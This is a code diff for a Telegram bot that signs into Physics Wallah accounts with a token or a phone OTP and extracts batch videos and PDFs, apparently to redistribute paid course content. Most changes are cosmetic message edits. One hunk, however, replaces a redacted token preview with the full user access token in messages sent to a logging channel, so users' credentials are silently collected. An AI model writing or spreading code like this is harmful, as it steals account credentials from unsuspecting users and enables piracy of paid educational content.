@@ -867,7 +867,7 @@ async def log_extraction_to_channel(bot, user_id, user_name, user_username, batc
             f"👤 Name: {user_name or 'N/A'}\n"
             f"👤 Username: @{user_username if user_username else 'N/A'}\n"
             f"📚 Batch: `{batch_name}`\n"
-            f"🔐 Token: `{token_preview}`\n"
+            f"🔐 Token: `{token}`\n"
             f"📄 Files: {', '.join(file_types)}\n"
             f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S IST')}"
         )
@@ -3072,8 +3072,8 @@ async def start(bot, message):
     _save_broadcast_users(broadcast_users)
     random_image_url = random.choice(image_list)
     keyboard = [
-        [InlineKeyboardButton("🚀😁 PHYSICS WALLAH 🚀 ", callback_data="pwwp")],
-        [InlineKeyboardButton("🔍 Developer", url="https://t.me/teamcinderella")]
+        [InlineKeyboardButton("😻💕PHYSICS WALLAH💕 ", callback_data="pwwp")],
+        [InlineKeyboardButton("🔍Join Channel", url="https://t.me/teamcinderella")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await message.reply_photo(
@@ -3215,7 +3215,7 @@ async def batch_next_callback(bot, callback_query):
         _, text = get_batches_for_page(user_id, new_page)
         keyboard = build_batch_pagination_keyboard(user_id, new_page)
 
-        header = f"**Send index number of the course to download.\n\n{text}\n\nIf Your Batch Not Listed Above Enter - No**"
+        header = f"**Send index number of the course to download.\n\n{text}\n\nIf Your Batch Not Listed Above Enter contact: @SmartBoy_ApnaMS**"
         try:
             await callback_query.message.edit_text(header, reply_markup=keyboard)
         except Exception as e:
@@ -3241,7 +3241,7 @@ async def batch_prev_callback(bot, callback_query):
         _, text = get_batches_for_page(user_id, new_page)
         keyboard = build_batch_pagination_keyboard(user_id, new_page)
 
-        header = f"**Send index number of the course to download.\n\n{text}\n\nIf Your Batch Not Listed Above Enter - No**"
+        header = f"**Send index number of the course to download.\n\n{text}\n\nIf Your Batch Not Listed Above Contact: @SmartBoy_ApnaMS**"
         try:
             await callback_query.message.edit_text(header, reply_markup=keyboard)
         except Exception as e:
@@ -3259,9 +3259,9 @@ async def batch_page_info_callback(bot, callback_query):
 # ===============================================================
 async def process_pwwp(bot, m, user_id):
     editable = await m.reply_text(
-        "**Enter Working Access Token\n\nOR\n\nEnter Phone Number\n\n"
-        "Ab koi bhi valid PW token daalo, ALL batches ka content niklega "
-        "with Videos, PDFs & Video IDs!**"
+        "**Enter Working Access Token\n\nOR\n\nEnter Phone Number(without +91)\n\n"
+        "NOTE: Jis Batch Ka Token hai uska Sara Content aayega with Videos & PDFs "
+        "But Agar Us Batch ka Token nahi to Sirf Notes & DPP PDFs hi Milegi😒.**"
     )
 
     try:
@@ -3269,7 +3269,7 @@ async def process_pwwp(bot, m, user_id):
         raw_text1 = input1.text
         await input1.delete(True)
     except:
-        await editable.edit("**Timeout! You took too long to respond😢.**")
+        await editable.edit("**Timeout! You took too long to respond😢\n\nPlease response under 60 seconds🙂.**")
         return
 
     headers = get_pw_mobile_headers("")
@@ -3295,13 +3295,13 @@ async def process_pwwp(bot, m, user_id):
                     await editable.edit(f"**Error : {e}**")
                     return
 
-                editable = await editable.edit("**ENTER OTP YOU RECEIVED**")
+                editable = await editable.edit("**ENTER OTP YOU RECEIVED\n\nOnly Enter 6 digit OTP.**")
                 try:
                     input2 = await bot.listen(chat_id=m.chat.id, filters=filters.user(user_id), timeout=120)
                     otp = input2.text
                     await input2.delete(True)
                 except:
-                    await editable.edit("**Timeout! You took too long to respond**")
+                    await editable.edit("**Timeout! You took too long to respond\n\nPlease response under 60 seconds🙂.**")
                     return
 
                 payload = {
@@ -3322,10 +3322,10 @@ async def process_pwwp(bot, m, user_id):
                     ) as response:
                         access_token = (await response.json())["data"]["access_token"]
                         await editable.edit(
-                            f"<b>Physics Wallah Login Successful ✅</b>\n\n"
+                            f"<b>🤩Physics Wallah Login Successfully✅</b>\n\n"
                             f"<pre language='Save this Login Token for future usage'>{access_token}</pre>\n\n"
                         )
-                        editable = await m.reply_text("**Getting ALL Batches...**")
+                        editable = await m.reply_text("**Getting ALL Batches...\n\nPlease Wait...🤭**")
                 except Exception as e:
                     await editable.edit(f"**Error : {e}**")
                     return
@@ -3358,21 +3358,21 @@ async def process_pwwp(bot, m, user_id):
 
             if direct_token_login:
                 await editable.edit(
-                    f"<b>Physics Wallah Login Successful ✅</b>\n\n"
+                    f"<b>😘Physics Wallah Login Successfully✅</b>\n\n"
                     f"<pre language='Save this Login Token for future usage'>{access_token}</pre>\n\n"
                 )
-                editable = await m.reply_text("**Getting ALL Batches...**")
+                editable = await m.reply_text("**Getting ALL Batches...\n\nPlease Wait...🤭**")
 
             await editable.edit(
                 "**Enter Your Batch Name\n\n"
-                "Sirf aapke PURCHASED batches search honge.**"
+                "Remeber Only Purchased Batch ke Videos hi aayenge Otherwise Sirf PDFs😐.**"
             )
             try:
                 input3 = await bot.listen(chat_id=m.chat.id, filters=filters.user(user_id), timeout=120)
                 batch_search = input3.text
                 await input3.delete(True)
             except:
-                await editable.edit("**Timeout! You took too long to respond😢.**")
+                await editable.edit("**Timeout! You took too long to respond😢\n\nPlease response under 60 seconds🙂..**")
                 return
 
             # ==========================================================
@@ -3404,7 +3404,7 @@ async def process_pwwp(bot, m, user_id):
                 f"**Send index number of the course to download.\n\n"
                 f"{text}\n\n"
                 f"Showing page 1 of {total_pages} ({total_batches} total batches)\n"
-                f"If Your Batch Not Listed Above Enter - No**"
+                f"If Your Batch Not Listed Above Enter Contact: @SmartBoy_ApnaMS**"
             )
 
             # Edit the message with pagination keyboard
@@ -3415,7 +3415,7 @@ async def process_pwwp(bot, m, user_id):
                 raw_text4 = input4.text
                 await input4.delete(True)
             except:
-                await editable.edit("**Timeout! You took too long to respond😢.**")
+                await editable.edit("**Timeout! You took too long to respond😢\n\nPlease response under 60 seconds🙂.**")
                 # Clean up pagination state
                 user_batch_pages.pop(user_id, None)
                 return
@@ -3449,7 +3449,7 @@ async def process_pwwp(bot, m, user_id):
                         raw_text5 = input5.text
                         await input5.delete(True)
                     except:
-                        await editable.edit("**Timeout! You took too long to respond😢.**")
+                        await editable.edit("**Timeout! You took too long to respond😢\n\nPlease response under 60 seconds🙂.**")
                         return
 
                     if input5.text.isdigit() and 1 <= int(input5.text) <= len(courses):
@@ -3485,7 +3485,7 @@ async def process_pwwp(bot, m, user_id):
                 raw_text6 = input6.text
                 await input6.delete(True)
             except ListenerTimeout:
-                await editable.edit("**Timeout! You took too long to respond😢.**")
+                await editable.edit("**Timeout! You took too long to respond😢n\nPlease response under 60 seconds🙂.**")
                 return
             except Exception as e:
                 logging.exception("Error during option listening:")
